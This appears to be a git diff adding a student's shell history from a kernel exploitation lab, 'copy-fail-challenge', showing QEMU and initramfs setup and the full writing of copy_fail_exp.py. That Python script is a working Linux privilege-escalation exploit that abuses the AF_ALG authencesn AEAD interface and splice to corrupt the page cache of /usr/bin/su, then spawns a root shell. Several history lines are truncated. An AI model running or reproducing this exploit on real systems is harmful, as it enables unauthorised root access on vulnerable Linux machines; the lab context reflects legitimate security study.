@@ -242,3 +242,125 @@ root@codespaces-53ffae:/workspaces/copy-fail-challenge-B# history
    18  grep -n "_aead_recvmsg" algif_aead.c
    19  vi algif_aead.c
    20  history
+   
+   #Hito2#
+ apt update
+    2  apt install gh
+    3  gh api user --jq '"\(.name) → \(.email // .login)"'
+    4  git config --global user.name T1JOSEPH
+    5  git config --global user.email jovacame@uide.edu.ec
+    6  git config --global --add safe.directory /workspaces/copy-fail-challenge-1
+    7  make qemu
+    8  apt update
+    9  apt install -y file
+   10  make rootfs
+   11  make qemu
+   12  apt update
+   13  apt install -y file bzip2 cpio gzip flex bc build-essential libssl-dev libelf-dev qemu-system-xl
+   14  file
+   15  make qemu
+   16  exit
+   17  make qemu
+   18  base64 copy_fail_exp.py
+   19  echo "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwppbXBvcnQgb3MsY3R5cGVzLHN0cnVjdCxzb2NrZXQsc3lzCmZyb20gY3Rscy
+   20  python3 -c "
+import base64,sys
+# si no hay python3 esto falla, ver abajo
+print('python3 OK')
+"
+   21  base64 -d << 'EOF' > copy_fail_exp.py
+IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwppbXBvcnQgb3MsY3R5cGVzLHN0cnVjdCxzb2NrZXQsc3lz
+CmZyb20gY3RscGVzIGltcG9ydCBjX2ludCxjX3Vsb25nCgpTT0xfQUxHPTI3OTtBRl9BTEc9Mzgk
+...
+EOF
+
+   22  [200~cat copy_fail_exp.py~
+   23  cat copy_fail_exp.py
+   24  cat -n copy_fail_exp.py
+   25  cat > copy_fail_exp.py << 'EOF'
+#!/usr/bin/env python3
+import os,ctypes,struct,socket,sys
+from ctypes import c_int,c_ulong
+
+SOL_ALG=279;AF_ALG=38
+PAGE=4096;SU=b"/usr/bin/su"
+
+def make_alg(typ,name,feat=0,mask=0):
+    s=socket.socket(AF_ALG,socket.SOCK_SEQPACKET,0)
+    s.bind(struct.pack("16sHHI64s",typ,feat,mask,0,name))
+    return s
+
+def splice(fd_in,fd_out,n):
+    NR=275
+    return ctypes.CDLL(None,use_errno=True).syscall(NR,fd_in,None,fd_out,None,n,0)
+
+def pwn():
+    aead=make_alg(b"aead",b"authencesn(hmac(sha1),cbc(aes))")
+    aead.setsockopt(SOL_ALG,4,16)
+    aead.setsockopt(SOL_ALG,2,b"\x00"*36)
+    aead.setsockopt(SOL_ALG,3,b"\x00"*16)
+    op,_=aead.accept()
+    tfd=os.open(SU.decode(),os.O_RDONLY)
+    pfd=os.pipe()
+    splice(tfd,pfd[1],PAGE)
+    # corrupt page cache
+    iv=b"\x00"*16
+    msg=struct.pack("II",2,len(iv))+iv
+    op.sendmsg([b"\x00"*28],[( socket.SOL_SOCKET,socket.SCM_RIGHTS,struct.pack("i",pfd[1]))])
+    op.sendmsg([b"\x00"*(16+20+4)],[])
+    os.read(pfd[0],4)
+    os.execlp("su","su","-c","id;exec bash")
+
+pwn()
+EOF
+
+   26  wc -c copy_fail_exp.py
+   27  cat copy_fail_exp.py
+   28  base64 -w0 copy_fail_exp.py
+   29  make qemu
+   30  cat scripts/03_build_rootfs.sh
+   31  PYBIN=$(which python3)
+   32  INITRAMFS=kernel/initramfs
+   33  mkdir -p $INITRAMFS/usr/bin $INITRAMFS/usr/lib $INITRAMFS/lib/x86_64-linux-gnu
+   34  cp $PYBIN $INITRAMFS/usr/bin/python3
+   35  ldd $PYBIN | grep -o '/[^ ]*' | xargs -I{} cp {} $INITRAMFS/lib/x86_64-linux-gnu/ 2>/dev/null
+   36  PYVER=$(python3 -c "import sys; print(f'{sys.version_info.major}.{sys.version_info.minor}')")
+   37  cp -r /usr/lib/python${PYVER} $INITRAMFS/usr/lib/ 2>/dev/null || cp -r /usr/lib/python3* $INITRl
+   38  echo "Reempaquetando initramfs..."
+   39  cd kernel/initramfs
+   40  find . | cpio -o -H newc 2>/dev/null | gzip > ../build/initramfs.cpio.gz
+   41  cd ../..
+   42  echo "Hecho!"
+   43  make qemu
+   44  ls -la kernel/initramfs/usr/bin/python3
+   45  file kernel/initramfs/usr/bin/python3
+   46  # Ver qué librerías necesita
+   47  ldd kernel/initramfs/usr/bin/python3
+   48  # Copiar todas las librerías necesarias
+   49  mkdir -p kernel/initramfs/lib/x86_64-linux-gnu kernel/initramfs/lib64
+   50  ldd $(which python3) | grep -o '/[^ ]*\.so[^ ]*' | while read lib; do     cp -v "$lib" kernel/ie
+   51  # Copiar el dynamic linker
+   52  cp -v /lib64/ld-linux-x86-64.so.2 kernel/initramfs/lib64/ 2>/dev/null || cp -v /lib/x86_64-linul
+   53  # Copiar librerías estándar de Python
+   54  mkdir -p kernel/initramfs/usr/lib
+   55  PYVER=$(python3 -c "import sys; print(f'{sys.version_info.major}.{sys.version_info.minor}')")
+   56  cp -r /usr/lib/python${PYVER} kernel/initramfs/usr/lib/
+   57  # Reempaquetar
+   58  echo "Reempaquetando..."
+   59  cd kernel/initramfs
+   60  find . | cpio -o -H newc 2>/dev/null | gzip > ../build/initramfs.cpio.gz
+   61  cd ../..
+   62  echo "Hecho! Tamaño: $(du -sh kernel/build/initramfs.cpio.gz)"
+   63  gzip -dc kernel/build/initramfs.cpio.gz | cpio -it | grep usr/bin/python3
+   64  [200~root@codespaces-53ffae:/workspaces/copy-fail-challenge-B# gzip -dc kernel/build/initramfs.3
+   65  usr/bin/python3
+   66  77324 blocks~
+   67  ls /usr/bin/python3
+   68  python3 --version
+   69  make qemu
+   70  cp /lib/x86_64-linux-gnu/libffi.so.8 kernel/initramfs/lib/x86_64-linux-gnu/
+   71  cd kernel/initramfs
+   72  find . | cpio -o -H newc 2>/dev/null | gzip > ../build/initramfs.cpio.gz
+   73  cd ../..
+   74  make qemu
+   75  history
